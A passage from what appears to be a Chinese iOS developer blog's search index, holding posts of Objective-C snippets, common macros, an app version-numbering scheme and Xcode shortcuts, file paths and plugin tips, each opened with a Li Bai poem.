    <content type="text"><![CDATA[镜湖三百里，菡萏发荷花。五月西施采，人看隘若耶。回舟不待月，归去越王家。 ——李白《子夜四时歌·夏歌》 琐碎分类与扩展 分类（Category） 只能扩充方法、不能扩充成员变量 不是说不能写property属性，而是写了只会有对应的setter和getter方法的声明，而没有这这两个方法的实现 （UIView扩充的那些只是重写了方法 并不是添加了新的属性变量） 可以用runtime添加属性 匿名分类 （括号里没有名称） 可以扩充方法、也可以扩充成员变量 一篇比较详细深入的参考资料 Automatic Preferred Max Layout Width 警告解决办法 CocoaPods导入格式 第一种写法（没更新到cocoapods最近版本可用） 12platform : ios, '7.0'pod 'AFNetworking' 第二种写法 （更新到最新的版本第一种写法报错） 1234platform :ios, '7.0'target "iOS项目名" dopod 'FMDB'end 如何退出VIM编辑器 i 是进入编辑 进入编辑状态后按 ：esc 再按 shift＋zz，注意是两下z nil、Nil、NULL的区别 nil：指向oc中对象的空指针，针对对象。 Nil：指向oc中类的空指针，针对类。 NULL：指向其他类型的空指针，如一个c类型的内存指针，基本数据类型为空，基本类型。 NSNull：在集合对象中，表示空值的对象。 若obj为nil： ［obj message］将返回NO,而不是NSException 若obj为NSNull: ［obj message］将抛出异常NSException 处理服务器返回的null空数据 用AFN请求网络时可以使用self.removesKeysWithNullValues = YES; 使用分类 NullSafe 直接将NullSafe.m文件拖到项目中，不需要引入任何.h头文件。可以在运行时自动将JSON中的null值替换成nil。 github地址 终极解决办法：MJExtension实现字典转模型。 App跳转方法1[[UIApplication sharedApplication] openURL:[NSURL URLWithString:[NSString stringWithFormat:@"itms-apps://itunes.apple.com/app/id%@", myAppID]]]; 获取Window的区别123AppDelegate* appDelegate = (AppDelegate*)[UIApplication sharedApplication].delegate;UIWindow* window = appDelegate.window;UIWindow* keyw = [UIApplication sharedApplication].keyWindow; 在没有使用UIAlertView时，两者一样，均为我们应用的的Window，其delegate为我们的rootViewController。 在调用了UIAlertView show之后，到UIAlertView消失之前，keyw的值是UIAlertControllerShimPresenterWindow，其delegate是UIAlertShimPresentingViewController。 版本号区别 CFBundleShortVersionString 该标志表示就是应用的版本号，一般是由三个整数分隔组成的字符串。第一个整数代表重大修改的版本，如实现新的功能或重大变化的修订。第二个整数表示的修订，实现较突出的特点。第三个整数代表维护版本。 该键的值不同于“CFBundleVersion”标识 CFBundleShortVersionString对应Xcode里项目的Version CFBundleVersion 标识应用的内部版本号 这个版本是内部自己团队使用的一个版本号，一般不对外公开。 CFBundleVersion 对应Xcode里项目的Build 点击UIButton弹出UIPickerView1234567891011121314151617181920212223// 用来弹出控件 UITextField *pickerViewTextField = [[UITextField alloc] initWithFrame:CGRectZero]; [self.view addSubview:pickerViewTextField]; self.pickerViewTextField = pickerViewTextField; // 设置选择控件 UIPickerView *pickerView = [[UIPickerView alloc] init]; pickerView.delegate = self; pickerView.dataSource = self; pickerView.showsSelectionIndicator = YES; self.pickerView = pickerView; pickerViewTextField.inputView = pickerView;// 工具条 UIToolbar *toolbar = [[UIToolbar alloc] init]; toolbar.height = 44; UIBarButtonItem *item0 = [[UIBarButtonItem alloc] initWithTitle:@"取消" style:UIBarButtonItemStylePlain target:self action:@selector(cancelBtnClick)]; UIBarButtonItem *item1 = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemFlexibleSpace target:nil action:nil]; UIBarButtonItem *item2 = [[UIBarButtonItem alloc] initWithTitle:@"完成" style:UIBarButtonItemStylePlain target:self action:@selector(conformBtnClick)]; toolbar.items = @[item0, item1, item2]; pickerViewTextField.inputAccessoryView = toolbar;// 一定要写 不然弹不出来 [pickerViewTextField becomeFirstResponder]; UITableViewCellUITableViewCell背景颜色 UITableViewCell 设置背景颜色必须是ContentView 自定义XIB可能没有ContentView，也需要自己创建 UITableViewCell选中颜色 iOS6之前可以设置选中颜色为灰色、蓝色、没有颜色；iOS7开始只有默认灰色和没有颜色两种，需要的话可以自定义选中背景设置想要的颜色 UITableViewCellSelectionStyleBlue The cell has a default background color when selected. In iOS 7, the selection color is no longer blue. Use UITableViewCellSelectionStyleDefault instead. 1234UIView *bgColorView = [[UIView alloc] init];bgColorView.backgroundColor = [UIColor blueColor];bgColorView.layer.masksToBounds = YES;cell.selectedBackgroundView = bgColorView; UINavigationController手势问题 UINavigationController 添加手势会默认添加给所有push进来的控制器 可以通过push进来的控制器的数量控制，（topViewController 可以拿到栈顶控制器，在根控制器地方设置的话就是拿到根控制器） 下面的方法也可以过滤不同的手势 gestureRecognizer:可以判断当前触发的手势是哪一个 1234- (BOOL)gestureRecognizerShouldBegin:(UIGestureRecognizer *)gestureRecognizer &#123; XSLog(@"gestureRecognizer : %@", gestureRecognizer); return self.viewControllers.count &gt; 1;&#125; 想隐藏导航控制器的导航栏 方法1 （缺点：滑动返回时候可以看见过度不协调，切换主题如果换导航栏颜色也不协调） 在ViewWillAppear方法设置导航栏隐藏 在ViewWillDisappear方法设置导航栏出现（防止push的其他控制器导航栏也被隐藏） 方法2 （推荐） 需要隐藏导航栏的控制器遵循 UINavigationControllerDelegate 需要隐藏导航栏的控制器设置代理 self.navigationController.delegate = self; 需要隐藏导航栏的控制器 实现代理方法 1234567// 设置导航栏控制器隐藏- (void)navigationController:(UINavigationController *)navigationController willShowViewController:(UIViewController *)viewController animated:(BOOL)animated &#123;// 判断要显示的控制器是否是自己BOOL isLoginVC = [viewController isKindOfClass:[self class]];[self.navigationController setNavigationBarHidden:isLoginVC animated:YES];&#125; 导航栏设置背景颜色为纯色技巧 导航栏默认是不能设置为纯色的，因为系统会自动的加上一个不透明度，所以需要用纯色渲染一张背景图然后设置背景图片就可以了。 设置导航栏背景图片，如果有可以上下滚动的视图可能上下边距就会变化，需要加减相应写导航栏高度的内边距。 AES 加密模式及填充方式 PKCS7Padding ：缺几个字节就补几个字节的0 PKCS5Padding ：缺几个字节就补充几个字节的几，比如缺7个字节，就补充7个字节的7 全局变量的设置方法 使用UserDefualt 实现APP全局变量 在AppDelegate中声明并初始化全局变量、然后在需要使用该变量的地方插入如下的代码： 123//取得AppDelegate，在iOS中，AppDelegat被设计成了单例模式 AppDelegate *appDelegate = [[UIApplication sharedApplication] delegate];appDelegate.Your Variable 使用 extern 关键字 新建Constants.h文件（文件名根据需要自己取），用于存放全局变量 在Constants.h中写入你需要的全局变量名， 例如： NSString *url;//指针类型 int count; //非指针类型 注意：在定义全局变量的时候不能初始化，否则会报错！ 在需要用到全局变量的文件中引入此文件： 1#import "Constants.h" 给全局变量初始化或者赋值： 12345extern NSString *url;url = [[NSString alloc] initWithFormat:@"http://www.google.com"];//指针类型；需要alloc（我试过直接 url = @"www.google.com" 好像也能访问 ）extern int count;count = 0;//非指针类型 3.5 使用全局变量：和使用普通变量一样使用。 性能优化技巧 在循环里面存在大量临时变量，需要手动释放内存，优化导致内存的暴增带来的闪退问题。 12345678for (int i = 0; i&lt;1000000; i++) &#123; @autoreleasepool &#123; NSString *str = @"ABc"; NSString *string = [str lowercaseString]; string = [string stringByAppendingString:@"xyz"]; NSLog(@"%@",string); &#125;&#125; 参考 防止把线下版本打包上传发布AppStore的措施 在Target -&gt; Build Setting 里面搜索Skip Install 将Release环境以外的Skip Install配置成NO，就不会Archive出ipa包 OpenSSL 转证书格式1234// .crt 转 .ceropenssl x509 -in ca.crt -out certificate.cer -outform der// .crt 转 .deropenssl x509 -in ca.crt -out certificate.der -outform der Shadowrocket 状态栏不显示VPN 解决方法 Shadowrocket--Stettings--Config--LOCAL FILES里，点使用的配置文件右边的感叹号，General–最下面有个BYPASS TUN 把里面第一个0.0.0.0/8删掉 制作Mac启动U盘1sudo /Applications/Install\ OS\ X\ El\ Capitan.app/Contents/Resources/createinstallmedia --volume /Volumes/USBName --applicationpath /Applications/Install\ OS\ X\ El\ Capitan.app --nointeraction]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>碎片</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发中常用发的宏定义]]></title>
    <url>%2Farchives%2F9f7da62.html</url>
    <content type="text"><![CDATA[少年上人号怀素，草书天下称独步。墨池飞出北溟鱼，笔锋杀尽中山兔。八月九月天气凉，酒徒词客满高堂。笺麻素绢排数厢，宣州石砚墨色光。吾师醉后倚绳床，须臾扫尽数千张。飘风骤雨惊飒飒，落花飞雪何茫茫。起来向壁不停手，一行数字大如斗。怳怳如闻神鬼惊，时时只见龙蛇走。左盘右蹙如惊电，状同楚汉相攻战。湖南七郡凡几家，家家屏障书题遍。王逸少，张伯英，古来几许浪得名。张颠老死不足数，我师此义不师古。古来万事贵天生，何必要公孙大娘浑脱舞。 ——李白 《草书歌行》 # 常用的宏定义文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// 判断字符串是否为空#define kStringIsEmpty(str) ([str isKindOfClass:[NSNull class]] || str == nil || [str length] &lt; 1 ? YES : NO )// 判断数组是否为空#define kArrayIsEmpty(array) (array == nil || [array isKindOfClass:[NSNull class]] || array.count == 0)// 判断字典是否为空#define kDictIsEmpty(dic) (dic == nil || [dic isKindOfClass:[NSNull class]] || dic.allKeys == 0)// 判断对象是否为空#define kObjectIsEmpty(_object) (_object == nil \ || [_object isKindOfClass:[NSNull class]] \ || ([_object respondsToSelector:@selector(length)] &amp;&amp; [(NSData *)_object length] == 0) \ || ([_object respondsToSelector:@selector(count)] &amp;&amp; [(NSArray *)_object count] == 0))// 一些缩写#define kApplication [UIApplication sharedApplication]#define kKeyWindow [UIApplication sharedApplication].keyWindow#define kAppDelegate [UIApplication sharedApplication].delegate#define kUserDefaults [NSUserDefaults standardUserDefaults]#define kNotificationCenter [NSNotificationCenter defaultCenter]// App版本号及名称#define kAppVersion [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleShortVersionString"]#define kAppDisplayName [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"]// 区分不同语言导入的头文件#ifdef __OBJC__#import &lt;UIKit/UIKit.h&gt;#import &lt;Foundation/Foundation.h&gt;#import "XSConst.h"#endif// 区分不同环境接口#ifdef DEBUG // 调试状态, 打开LOG功能#define XSLog(...) NSLog(__VA_ARGS__)#define XSKYDWAPIURL @"your_server_debug_url"#define XSKYDWImageAPIURL @"your_server_debug_url"#else // 发布状态, 关闭LOG功能#define XSLog(...)#define XSKYDWAPIURL @"your_server_release_url"#define XSKYDWImageAPIURL @"your_server_release_url"#endif// 打印方法调用#define XSLogFuc XSLog(@"%s", __func__);// 颜色设置#define XSColor(r, g, b) [UIColor colorWithRed:(r)/255.0 green:(g)/255.0 blue:(b)/255.0 alpha:1]// 有透明度的颜色#define XSColorA(r, g, b, a) [UIColor colorWithRed:(r)/255.0 green:(g)/255.0 blue:(b)/255.0 alpha:(a)/255.0]// 灰色#define XSGrayColor(value) XSColor(value, value, value)// 全局灰色#define XSCommonBgColor XSGrayColor(238)// 标签的背景颜色#define XSTagBgColor XSColor(70, 142, 243)// 随机色#define XSRandomColor [UIColor colorWithRed:arc4random_uniform(256)/255.0 green:arc4random_uniform(256)/255.0 blue:arc4random_uniform(256)/255.0 alpha:1.0]// 屏幕的宽高#define kSScreenW [UIScreen mainScreen].bounds.size.width#define kSScreenH [UIScreen mainScreen].bounds.size.height// 判断系统的版本#define iOS7 ([[UIDevice currentDevice].systemVersion doubleValue] &gt;= 7.0)#define iOS8 ([[UIDevice currentDevice].systemVersion doubleValue] &gt;= 8.0)#define iOS9 ([[UIDevice currentDevice].systemVersion doubleValue] &gt;= 9.0)// 为了解析服务器返回的数据 写到pilst文件里面看更清晰#define XSWriteToPlist(obj, filename) [obj writeToFile:[NSString stringWithFormat:@"/Users/user11-kydw/Desktop/%@.plist", filename] atomically:YES];// 消除调用performSelector在ARC下的警告 （系统无法确定返回值类型）#define SuppressPerformSelectorLeakWarning(Stuff) \do &#123; \_Pragma("clang diagnostic push") \_Pragma("clang diagnostic ignored \"-Warc-performSelector-leaks\"") \Stuff; \_Pragma("clang diagnostic pop") \&#125; while (0)]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>App Version</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于App版本号命名规则]]></title>
    <url>%2Farchives%2F4edead15.html</url>
    <content type="text"><![CDATA[两人对酌山花开，一杯一杯复一杯。我醉欲眠卿且去，明朝有意抱琴来。 ——李白 《山中与幽人对酌》 项目中App发布版本统一处理为了统一iOS和安卓两个平台的发布版本不会产生混乱。定义版本号信息为如下格式：主版本号.次版本号.修订版本号 eg : 2.0.0 主版本号：接口做了不支持向下兼容的更改或者界面重构，升级主版本号； 次版本号：做了功能性升级，支持向下兼容，老版本依然正常使用； 修订号：做问题修正，通常修复已知问题（各自维护） 1.0.0 // 第一次发布版本 1.0.1 // 各自的维护的修复bug版本 … 1.1.0 // 正常迭代和新功能添加版本 (统一) … 2.0.0 // 正常迭代和重大改版版本 （需要） …]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>App Version</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发工具Xcode快捷键及相关知识整理]]></title>
    <url>%2Farchives%2Ffd0d6f33.html</url>
    <content type="text"><![CDATA[犬吠水声中，桃花带雨浓。树深时见鹿，溪午不闻钟。野竹分青霭，飞泉挂碧峰。无人知所去，愁倚两三松。 ——李白 《访戴天山道士不遇》 Xcode常用快捷键 Option + shift + K 打出Apple的logo  Command + option + Enter 拖线的时候快速切换到相应的界面 Command + Enter 标准界面 Command + option + 左箭头 折叠代码块 Command + option + 右箭头 打开代码块 Command + option + shift + 左箭头 折叠全部代码块 Command + option + shift + 右箭头 打开全部代码块 Command + option + ，快速分屏 Command + shift + ，打开scheme的界面 Command + shift + O 快速查找文件位置 Command + shift + J 快速定位跳转到查找的文件的位置 Command + control + 上下方向键 快速切记.h .m文件 Command + Option+ 0 显示/隐藏左边实用工具面板 Control + 6 列出当前文件中的方法 Control + 1 切换到Project Navigator Command + Control + Left/right 切换到上次编辑的位置 Control + i 选中代码左对齐 Xcode中用的插件 Alcatraz 一个插件管理平台，下载和移除插件 VVDocumenter 经典的注释插件 FuzzyAutocomplete 代码补全支持模糊查询 KSImageNamed 图片提示插件（Xcode8可以不用了，默认自带 仅限swift） Backlight 当前编辑位置高亮显示 （Xcode8可以不用了，默认自带） Cocoapods 管理三方库的插件、特别实用 ColorSense 颜色提示插件、还可以输入颜色时有一个色板给你选 安装完默认没有效果，需要在Xcode-Edit里面设置显示方式及颜色（我配置的颜色R:127 G: 127 B:121 Opacity:45% Hex Color : #7F7F79） XToDo 快捷键标记，和统一查看 ActivatePowerMode 敲代码时屏幕抖动火花迸溅效果 装逼插件、无聊的时候玩，这个是带声音特效的，（XActivatePowerMode这个效果类似、不带声音特效） Xcode8 注释 Command + / 失效解决办法 终端执行下面代码，然后重启电脑 1~ sudo /usr/libexec/xpccachectl 低版本XCode不支持高版本iOS系统进行真机调试解决方案 这个目录下有当前Xcode所支持的所有真机系统 把最新的Xcode里面的最新的文件拷贝到低版本Xcode里面 1/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport 这个文件有支持的SDK包 把最新的Xcode里面的最新的包拷贝到低版本的Xcode里面 1/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/ 操作的时候尽量退出Xcode，如果完成以上两步还是不能真机调试的话就重启电脑。 常见文件路径 Xcode字体所在路径（提取Xcode8最新字体： San Francisco Mono ）复制到其他版本Xcode中，我得电脑需要切换英语重启电脑才可以选到 1/Applications/Xcode.app/Contents/SharedFrameworks/DVTKit.framework/Versions/A/Resources/Fonts Xcode描述文件路径 1~/Library/MobileDevice/Provisioning Profiles Xcode自带头文件的路径 1/Xcode/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator.sdk/System/Library/Frameworks/UIKit.framework/Headers 修改了系统自带头文件后,Xcode会报错解决方案:删掉下面文件夹的缓存即可(aplle是电脑的用户名) 1/Users/smile/Library/Developer/Xcode/DerivedData 或者 1/Users/smile/Library/Developer/Xcode/DerivedData Xcode的自定义代码块的位置 1/Users/smile/Library/Developer/Xcode/UserData/CodeSnippets Xcode 文档的位置 1/Applications/Xcode.app/Contents/Developer/Documentation/DocSets 插件的位置 1/Users/smile/Library/Application Support/Developer/Shared/Xcode/Plug-ins 沙盒的位置 1/Users/smile/Library/Developer/CoreSimulator/Devices/(文件名称 按时间排序找)/data/Containers/Data/Application 模拟器安装位置 1234// 没有/Profiles/Runtimes 这两个文件夹的话 手动创建/Library/Developer/CoreSimulator/Profiles/Runtimes/Users/smile/Library/Developer/CoreSimulator/Profiles/Runtimes]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>碎片</tag>
      </tags>
  </entry>
</search>
